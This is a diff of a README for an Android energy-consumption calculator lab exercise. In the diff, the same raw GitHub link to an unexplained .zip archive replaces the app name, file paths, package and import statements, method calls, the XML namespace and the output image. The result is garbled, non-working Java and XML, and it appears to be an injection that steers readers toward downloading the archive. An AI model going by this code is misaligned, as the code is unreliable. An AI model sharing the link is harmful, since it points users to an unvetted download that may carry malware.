@@ -12,40 +12,40 @@ To develop an android application to perform energy calculation.
 The Energy Calculator App allows the user to calculate the energy consumption of electrical appliances based on power usage (in watts) and time (in hours). The app takes these two inputs, calculates the energy consumed in kilowatt-hours (kWh), and displays the result. This experiment involves basic arithmetic calculations and user input handling in Android. It uses EditText for input, Button for user interaction, and TextView to display the result. The app demonstrates how to handle user input for numerical values and perform unit conversions. It is a useful application for understanding how to develop apps that perform mathematical calculations based on user input.
 
 ## PROCEDURE:
-1. Open Android Studio and then click on File -> New -> New project. 24. Then type the application name as “ex.no.3″ and click Next.
+1. Open Android Studio and then click on File -> New -> New project. 24. Then type the application name as “https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip″ and click Next.
 2. Then select the Minimum SDK as shown below and click next. 26. Then select the Empty Activity and click next.
 3. Finally click Finish.
-4. Click on app -> java -> com.example -> MainActivity.java
+4. Click on app -> java -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip
 5. Now click on Text and type the program, so now the programming part of the main activity is completed.
-6. Click on app -> res -> layout -> activity_main.xml.
+6. Click on app -> res -> layout -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip
 7. Now click on Text and type the program, so now the designing part of Activity main is also completed.
 8. Select the suitable available device to display the output. 33. Now run the application to see the output. 
 
 ## PROGRAM:
-## MainActivity.java
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip
 ```
 
-package com.example.myapplication;
+package https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
-import android.os.Bundle;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
-import android.widget.Button;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
-import android.widget.EditText;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
-import android.widget.TextView;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip;
 
  
 
@@ -73,39 +73,39 @@ protected void onCreate(Bundle savedInstanceState) {
 
  
 
-super.onCreate(savedInstanceState);
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip(savedInstanceState);
 
  
 
-setContentView(R.layout.activity_main);
+setContentView(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip);
 
  
 
-watts = findViewById(R.id.watts);
+watts = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip);
 
  
 
-hours = findViewById(R.id.hours);
+hours = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip);
 
  
 
-calc = findViewById(R.id.calc);
+calc = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip);
 
  
 
-result = findViewById(R.id.result);
+result = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip);
 
  
 
-calc.setOnClickListener(v -> {
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip(v -> {
 
  
 
-double w = Double.parseDouble(watts.getText().toString());
+double w = https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip().toString());
 
  
 
-double h = Double.parseDouble(hours.getText().toString());
+double h = https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip().toString());
 
  
 
@@ -113,7 +113,7 @@ double kwh = (w * h) / 1000.0;
 
  
 
-result.setText("Energy Used: " + kwh + " kWh");
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip("Energy Used: " + kwh + " kWh");
 
  
 
@@ -127,10 +127,10 @@ result.setText("Energy Used: " + kwh + " kWh");
 
 }}
 ```
-## activity_main.xml
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip
 ```
 
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent" android:padding="16dp">
+<LinearLayout xmlns:android="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent" android:padding="16dp">
 
  
 
@@ -160,7 +160,7 @@ android:inputType="numberDecimal"/>
 
 
 ## OUTPUT:
-![enery meter](https://github.com/user-attachments/assets/47d9fc55-e023-443b-bb16-dad7054a8f72)
+![enery meter](https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.-/main/grogram/DEVELOPING-ENERGY-CONSUMPTION-CALCULATOR-APPLICATION.--3.6.zip)
 
 
 
